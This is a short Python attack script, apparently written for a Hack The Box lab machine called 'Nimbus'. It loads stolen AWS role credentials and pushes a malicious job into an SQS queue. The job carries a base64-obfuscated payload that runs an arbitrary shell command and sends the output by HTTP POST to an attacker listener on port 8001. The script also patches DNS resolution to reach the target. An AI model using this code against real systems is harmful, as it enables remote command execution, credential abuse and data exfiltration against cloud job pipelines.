#!/usr/bin/env python3
import sys, json, base64, urllib.request, socket

CMD = sys.argv[1] if len(sys.argv) > 1 else sys.stdin.read()
TAG = sys.argv[2] if len(sys.argv) > 2 else "cmd"
LHOST = sys.argv[3] if len(sys.argv) > 3 else "10.10.15.199"

worker_code = f'''
import os, urllib.request, base64, subprocess
r = os.popen({CMD!r}).read()
urllib.request.urlopen("http://{LHOST}:8001/{TAG}", data=r.encode(), timeout=10)
'''

encoded = base64.b64encode(worker_code.encode()).decode()
wrapper = f"""
import sys, io, traceback, urllib.request, base64
_buf = io.StringIO()
sys.stdout = _buf; sys.stderr = _buf
try:
    exec(base64.b64decode({encoded!r}).decode())
except: traceback.print_exc()
sys.stdout = sys.__stdout__
data = _buf.getvalue().encode()
urllib.request.urlopen("http://{LHOST}:8001/cmd_out", data=data, timeout=10)
"""

body = "name: r-{TAG}\\nschedule: manual\\nruntime: python3.11\\nscript: |\\n"
body += "\\n".join("  " + l for l in wrapper.strip().splitlines())

orig = socket.getaddrinfo
def patch(h, *a):
    if h == "aws.nimbus.htb": h = "10.129.16.167"
    return orig(h, *a)
socket.getaddrinfo = patch

creds = json.load(open("Nimbus/nimbus_web_role_creds.json"))
import boto3
sqs = boto3.client("sqs", endpoint_url="http://10.129.16.167", region_name="us-east-1",
                   aws_access_key_id=creds["AccessKeyId"], aws_secret_access_key=creds["SecretAccessKey"],
                   aws_session_token=creds.get("Token",""))
r = sqs.send_message(QueueUrl="http://aws.nimbus.htb/847219365028/nimbus-jobs", MessageBody=body)
print(f"SENT job tag=r-{TAG} id={r['MessageId']}")
